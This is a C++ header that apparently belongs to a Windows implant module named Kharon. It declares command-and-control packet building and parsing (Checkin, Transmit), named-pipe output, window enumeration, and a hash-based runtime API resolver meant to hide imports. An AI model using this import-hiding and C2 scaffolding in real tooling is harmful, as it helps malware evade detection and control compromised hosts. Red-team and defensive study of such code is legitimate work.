#ifndef KHARON_H
#define KHARON_H

#include <Win32.h>

typedef struct {
    UINT32  CommandID;
    PVOID   Buffer;
    SIZE_T  Length;
    SIZE_T  Size;
    ULONG   Quantity;
    BOOL    Encrypt;
} PACKAGE, *PPACKAGE;

typedef struct {
    PCHAR   Original;
    PCHAR   Buffer;
    UINT32  Size;
    UINT32  Length;

    BOOL    Endian;
} PARSER, *PPARSER;

#ifdef DEBUG
#define KhDbg( x, ... ) { Kh->Ntdll.DbgPrint( ( "[DEBUG::MODULE::%s::%s::%d] => " x "\n" ), __FILE__ ,__FUNCTION__, __LINE__, ##__VA_ARGS__ ); }
#define KhDbgz( x, ... ) { Ntdll.DbgPrint( ( "[DEBUG::MODULE::%s::%s::%d] => " x "\n" ), __FILE__ ,__FUNCTION__, __LINE__, ##__VA_ARGS__ ); }
#else
#define KhDbgz( x, ... );
#define KhDbg( x, ... );
#endif

#define RSL_TYPE( x )   .x = reinterpret_cast<decltype( x )*>( Hsh::Str( #x ) ) 
#define RSL_API( m, f ) LdrLoad::Api<decltype(s)>( m, Hsh::Str( #f ) )

#define RSL_IMP( m ) { \
    for ( int i = 1; i < Hsh::StructCount<decltype( Kharon::m )>(); i++ ) { \
        reinterpret_cast<UPTR*>( &m )[ i ] = LdrLoad::_Api( m.Handle, reinterpret_cast<UPTR*>( &m )[ i ] ); \
    } \
}

#define RangeHeadList( HEAD_LIST, TYPE, SCOPE ) \
{                                               \
    PLIST_ENTRY __Head = ( & HEAD_LIST );       \
    PLIST_ENTRY __Next = { 0 };                 \
    TYPE        Entry  = (TYPE)__Head->Flink;   \
    for ( ; __Head != (PLIST_ENTRY)Entry; ) {   \
        __Next = ((PLIST_ENTRY)Entry)->Flink;   \
        SCOPE                                   \
        Entry = (TYPE)(__Next);                 \
    }                                           \
}

#define DECLAPI( x )  decltype( x ) * x
#define DECLTYPE( x ) ( decltype( x ) )
#define DECLFN        __attribute__( ( section( ".text$B" ) ) )

/*==============[ Dereference ]==============*/

#define C_DEF( x )   ( * ( PVOID* )  ( x ) )
#define C_DEF08( x ) ( * ( UINT8*  ) ( x ) )
#define C_DEF16( x ) ( * ( UINT16* ) ( x ) )
#define C_DEF32( x ) ( * ( UINT32* ) ( x ) )
#define C_DEF64( x ) ( * ( UINT64* ) ( x ) )

/*==============[ Casting ]==============*/

#define C_PTR( x )  reinterpret_cast<PVOID>( x )
#define U_PTR( x )  reinterpret_cast<UPTR>( x )
#define B_PTR( x )  reinterpret_cast<PBYTE>( x )
#define UC_PTR( x ) reinterpret_cast<PUCHAR>( x )

#define A_PTR( x )   reinterpret_cast<PCHAR>( x )
#define W_PTR( x )   reinterpret_cast<PWCHAR>( x )

#define U_64( x ) reinterpret_cast<UINT64>( x )
#define U_32( x ) reinterpret_cast<UINT32>( x )
#define U_16( x ) reinterpret_cast<UINT16>( x )
#define U_8( x )  reinterpret_cast<UINT8>( x )


namespace Mem {
    auto DECLFN Copy(
        _In_ PVOID Dst,
        _In_ PVOID Src,
        _In_ ULONG Size
    ) -> PVOID;

    auto DECLFN Set(
        _In_ UPTR Addr,
        _In_ UPTR Val,
        _In_ UPTR Size
    ) -> void;

    auto DECLFN Zero(
        _In_ UPTR Addr,
        _In_ UPTR Size
    ) -> void;
}

namespace Str {
    auto WCharToChar( 
        PCHAR  Dest, 
        PWCHAR Src, 
        SIZE_T MaxAllowed 
    ) -> SIZE_T;

    auto CharToWChar( 
        PWCHAR Dest, 
        PCHAR  Src, 
        SIZE_T MaxAllowed 
    ) -> SIZE_T;

    auto LengthA( 
        LPCSTR String 
    ) -> SIZE_T;

    auto LengthW( 
        LPCWSTR String 
    ) -> SIZE_T;

    auto CompareCountA( 
        PCSTR Str1, 
        PCSTR Str2, 
        INT16 Count 
    ) -> INT;

    auto CompareA( 
        LPCSTR Str1, 
        LPCSTR Str2 
    ) -> INT;

    auto CompareW( 
        LPCWSTR Str1, 
        LPCWSTR Str2 
    ) -> INT;

    auto ToUpperChar(
        char* str
    ) -> VOID;

    auto ToLowerChar( 
        PCHAR Str
    ) -> VOID;

    auto ToLowerWchar( 
        WCHAR Ch 
    ) -> WCHAR;

    auto CopyA( 
        PCHAR  Dest, 
        LPCSTR Src 
    ) -> PCHAR;

    auto CopyW( 
        PWCHAR  Dest, 
        LPCWSTR Src 
    ) -> PWCHAR;

    auto ConcatA( 
        PCHAR  Dest, 
        LPCSTR Src 
    ) -> PCHAR;

    auto ConcatW( 
        PWCHAR  Dest, 
        LPCWSTR Src 
    ) -> PWCHAR;

    auto IsEqual( 
        LPCWSTR Str1, 
        LPCWSTR Str2 
    ) -> BOOL;

    auto InitUnicode( 
        PUNICODE_STRING UnicodeString, 
        PWSTR           Buffer 
    ) -> VOID;

    auto GenRnd( 
        ULONG StringSize
    ) -> PCHAR;
}

namespace LdrLoad {
    auto Module(
        _In_ const ULONG LibHash
    ) -> UPTR;

    auto _Api(
        _In_ const UPTR ModBase,
        _In_ const UPTR SymbBase
    ) -> UPTR;

    template <typename T>
    inline auto Api(
        _In_ const UPTR ModBase,
        _In_ const UPTR SymbHash
    ) -> T* {
        return reinterpret_cast<T*>( _Api( ModBase, SymbHash ) );
    }
}

namespace Hsh {
    template <typename T>
    constexpr SIZE_T StructCount() {
        SIZE_T Count = 0;
        SIZE_T StructLen   = sizeof( T );

        while ( StructLen > Count * sizeof( UPTR ) ) {
            Count++;
        }

        return Count;
    }

    template <typename T = char>
    inline auto DECLFN Str(
        _In_ const T* String
    ) -> UPTR {
        ULONG CstHash = 0x515528a;
        BYTE  Value   = 0;

        while ( * String ) {
            Value = static_cast<BYTE>( *String++ );

            if ( Value >= 'a' ) {
                Value -= 0x20;
            }

            CstHash ^= Value;
            CstHash *= 0x01000193;
        }

        return CstHash;
    }

    template <typename T = char>
    constexpr auto XprStrA(
        const T* String
    ) -> UPTR {
        ULONG CstHash = 0x515528a;
        BYTE  Value   = 0;
    
        while ( * String ) {
            Value = static_cast<BYTE>( *String++ );
    
            if ( Value >= 'a' ) {
                Value -= 0x20;
            }
    
            CstHash ^= Value;
            CstHash *= 0x01000193;
        }
    
        return CstHash;
    }
}

class Parser;
class Package;

namespace Root {

    class Kharon {    
    public:
        Parser*    Psr;
        Package*   Pkg;
    
        struct {
            UPTR Start;
            UPTR Length;
        } Base = {};        

        struct {
            PCHAR PipeName;
            BOOL  Fork;
        } Ctx = {};
        
        struct {
            UPTR Handle;

            DECLAPI( CreateNamedPipeA ); 
            DECLAPI( WriteFile        );
        
        } Krnl32 = {
            RSL_TYPE( CreateNamedPipeA ),
            RSL_TYPE( WriteFile        )
        };

        struct {
            UPTR Handle;

            DECLAPI( DbgPrint );
            DECLAPI( NtClose );

            DECLAPI( RtlAllocateHeap   );
            DECLAPI( RtlReAllocateHeap );
            DECLAPI( RtlFreeHeap       );
        } Ntdll = {
            RSL_TYPE( DbgPrint ),
            RSL_TYPE( NtClose ),
    
            RSL_TYPE( RtlAllocateHeap   ),
            RSL_TYPE( RtlReAllocateHeap ),
            RSL_TYPE( RtlFreeHeap       ),
        };
                
        struct {
            UPTR Handle;

            DECLAPI( GetWindowTextA     );
            DECLAPI( IsWindowVisible    ); 
            DECLAPI( EnumDesktopWindows );
        } User32 = {
            RSL_TYPE( GetWindowTextA     ),
            RSL_TYPE( IsWindowVisible    ),
            RSL_TYPE( EnumDesktopWindows )
        };

        explicit Kharon();

        auto Init(
            _In_ PBYTE Parameter
        ) -> VOID;

        auto Start(
            _In_ UPTR Argument
        ) -> VOID;

        auto CALLBACK EnumWinProc(
            _In_ HWND   WinHandle,
            _In_ LPARAM Parameter
        ) -> BOOL;

        auto CALLBACK StaticEnumWinProc(
            _In_ HWND   WinHandle, 
            _In_ LPARAM Parameter
        ) -> BOOL;

        VOID InitPackage( Package* PackageRf ) { Pkg = PackageRf; }
        VOID InitParser( Parser* ParserRf ) { Psr = ParserRf; }
    };
}


class Package {
private:
    Root::Kharon* Kh;
public:
    Package( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};

    auto AddInt16( 
        _In_ PPACKAGE Package, 
        _In_ INT16    dataInt 
    ) -> VOID;

    auto AddInt32( 
        _In_ PPACKAGE Package, 
        _In_ INT32    dataInt
    ) -> VOID;

    auto AddInt64( 
        _In_ PPACKAGE Package, 
        _In_ INT64    dataInt 
    ) -> VOID;

    auto AddPad( 
        _In_ PPACKAGE Package, 
        _In_ PUCHAR   Data, 
        _In_ SIZE_T   Size 
    ) -> VOID;

    auto AddBytes( 
        _In_ PPACKAGE Package, 
        _In_ PUCHAR   Data, 
        _In_ SIZE_T   Size 
    ) -> VOID;

    auto AddByte( 
        _In_ PPACKAGE Package, 
        _In_ BYTE     dataInt 
    ) -> VOID;

    auto Create( 
        _In_ ULONG CommandID 
    ) -> PPACKAGE;

    auto New( 
        VOID
    ) -> PPACKAGE;

    auto Checkin(
        VOID
    ) -> PPACKAGE;

    auto Destroy( 
        _In_ PPACKAGE Package 
    ) -> VOID;

    auto Transmit( 
        _In_  PPACKAGE Package
    ) -> BOOL;

    auto Error(
        _In_ ULONG ErrorCode
    ) -> VOID;

    auto AddString( 
        _In_ PPACKAGE package, 
        _In_ PCHAR    data 
    ) -> VOID;

    auto AddWString( 
        _In_ PPACKAGE package, 
        _In_ PWCHAR   data 
    ) -> VOID;
};
    
class Parser {
private:
    Root::Kharon* Kh;
public:
    Parser( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};

    auto New( 
        _In_ PPARSER parser, 
        _In_ PBYTE   Buffer
    ) -> VOID;

    auto GetByte(
        _In_ PPARSER Parser
    ) -> BYTE;

    auto GetInt16(
        _In_ PPARSER Parser
    ) -> INT16;

    auto GetInt32(
        _In_ PPARSER Parser
    ) -> INT32;

    auto GetInt64(
        _In_ PPARSER Parser
    ) -> INT64;

    auto GetBytes(
        _In_  PPARSER parser,
        _Out_ PULONG  size
    ) -> PBYTE;

    auto GetStr( 
        _In_ PPARSER parser, 
        _In_ PULONG  size 
    ) -> PCHAR;

    auto GetWstr(
        _In_ PPARSER parser, 
        _In_ PULONG  size 
    ) -> PWCHAR;

    auto Destroy(
        _In_ PPARSER Parser 
    ) -> BOOL;   
};

#endif // KHARON_H